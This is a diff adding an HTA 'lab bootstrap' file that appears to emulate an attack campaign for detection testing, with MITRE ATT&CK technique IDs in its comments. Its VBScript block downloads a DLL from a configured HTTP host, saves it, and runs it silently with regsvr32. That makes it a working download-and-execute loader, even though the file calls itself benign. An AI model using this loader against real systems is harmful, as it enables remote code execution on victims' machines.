@@ -1,0 +1,100 @@
+<html>
+<!-- ============================================================
+     c0015 bootstrap HTA (benign, config-driven) — [LAB-SURROGATE]
+     Campaign mapping: T1218.005 (mshta proxy execution),
+     T1059.005 (VBScript) + T1059.007 (JScript), T1027 (base64
+     benign string decoded via MSXML bin.base64 — HTA JScript has
+     NO atob()), T1105 (HTTP download), T1036 (DLL named *.jpg),
+     T1218.010 (regsvr32 proxy execution).
+     All URLs/paths come from %PUBLIC%\C0015\config.ini; blocks are
+     independent (no cross-language scope dependency).
+     ============================================================ -->
+<head><title>c0015 lab bootstrap</title></head>
+<body>
+
+<script language="VBScript">
+' --- T1059.005 VBScript block: config + base64 decode + download + proxy run ---
+Function IniGet(section, key, def)
+    Dim fso, ini, ln, cur
+    IniGet = def
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim iniPath
+    iniPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%PUBLIC%") & "\C0015\config.ini"
+    If Not fso.FileExists(iniPath) Then Exit Function
+    Set ini = fso.OpenTextFile(iniPath, 1)
+    cur = ""
+    Do Until ini.AtEndOfStream
+        ln = Trim(ini.ReadLine)
+        If Len(ln) = 0 Then
+        ElseIf Left(ln, 1) = "[" And Right(ln, 1) = "]" Then
+            cur = Mid(ln, 2, Len(ln) - 2)
+        ElseIf cur = section Then
+            If Left(ln, Len(key) + 1) = key & "=" Then
+                IniGet = Mid(ln, Len(key) + 2)
+                Exit Do
+            End If
+        End If
+    Loop
+    ini.Close
+End Function
+
+Function B64Decode(s)            ' T1027: MSXML bin.base64 (JScript has no atob in HTA)
+    Dim doc, el
+    Set doc = CreateObject("Msxml2.DOMDocument")
+    Set el = doc.createElement("b64")
+    el.dataType = "bin.base64"
+    el.text = s
+    B64Decode = el.nodeTypedValue
+End Function
+
+Dim http_host, http_port, dll_name, dll_dir, marker_name, b64_name, b64_value, regsvr32_path
+http_host     = IniGet("bootstrap", "http_host", "")
+http_port     = IniGet("bootstrap", "http_port", "")
+dll_name      = IniGet("bootstrap", "dll_name", "")
+dll_dir       = IniGet("bootstrap", "dll_local_dir", "")
+marker_name   = IniGet("bootstrap", "marker_name", "")
+b64_name      = IniGet("bootstrap", "b64_marker_name", "")
+b64_value     = IniGet("bootstrap", "b64_value", "")
+regsvr32_path = IniGet("bootstrap", "regsvr32_path", "C:\Windows\System32\regsvr32.exe")
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+If http_host <> "" And http_port <> "" And dll_name <> "" And dll_dir <> "" Then
+    If Not fso.FolderExists(dll_dir) Then fso.CreateFolder(dll_dir)
+    If b64_value <> "" Then
+        Dim out
+        out = B64Decode(b64_value)                       ' T1027 observable
+        fso.CreateTextFile(dll_dir & "\" & b64_name, True).Write out
+    End If
+    Dim x, url
+    url = "http://" & http_host & ":" & http_port & "/" & dll_name
+    Set x = CreateObject("MSXML2.XMLHTTP")               ' T1105 + T1036 (dll as .jpg)
+    x.Open "GET", url, False
+    x.Send
+    If x.Status = 200 Then
+        Dim s
+        Set s = CreateObject("ADODB.Stream")
+        s.Open : s.Type = 1 : s.Write x.responseBody
+        s.SaveToFile dll_dir & "\" & dll_name, 2 : s.Close
+        Dim sh
+        Set sh = CreateObject("WScript.Shell")           ' T1218.010 proxy execution
+        sh.Run """" & regsvr32_path & """ /s """ & dll_dir & "\" & dll_name & """", 0, False
+    End If
+End If
+' control path: config absent/incomplete -> no network, no files, no process
+</script>
+
+<script language="JScript">
+// --- T1059.007 JScript block: independent benign observable (no atob) ---
+try {
+    var fso2 = new ActiveXObject("Scripting.FileSystemObject");
+    var sh2 = new ActiveXObject("WScript.Shell");
+    var pub = sh2.ExpandEnvironmentStrings("%PUBLIC%") + "\\C0015";
+    if (fso2.FolderExists(pub)) {
+        var f = fso2.CreateTextFile(pub + "\\js-marker.txt", true);
+        f.WriteLine("c0015 lab benign js block");
+        f.Close();
+    }
+} catch (e) { /* control: fail silently */ }
+</script>
+</body>
+</html>
